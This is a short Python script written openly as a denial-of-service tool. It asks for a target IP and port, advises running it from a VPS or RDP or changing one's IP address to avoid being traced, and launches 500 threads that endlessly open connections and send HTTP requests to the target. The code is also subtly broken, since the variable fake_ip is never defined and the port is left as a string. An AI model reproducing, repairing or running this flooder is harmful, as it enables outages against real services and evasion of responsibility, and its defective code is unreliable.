import socket
import threading
import time

#============target info================#
zombie_IP = input("Enter your target IP : ")
zombie_PORT = input("Enter the port : ")
print('''
|-------------------------ATTENTION------------------------------|
|   1!= you'd better run this script on VPS or RDP               |
|    2!= if u dont have one of them u should change your IP-add  |
|----------------------------------------------------------------|
''')

#============Attack func================#
def attack():
    #infinity stones
    while True:
        catapulta = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        catapulta.connect((zombie_IP, zombie_PORT))
        catapulta.sendto(("GET /" + zombie_IP + " HTTP/1.1\r\n").encode('ascii'), (zombie_IP, zombie_PORT))
        catapulta.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (zombie_IP, zombie_PORT))
        catapulta.close()

#============number of threads==========#
for i in range(500):
    N_0F_7 = threading.Thread(target=attack)
    N_0F_7.start()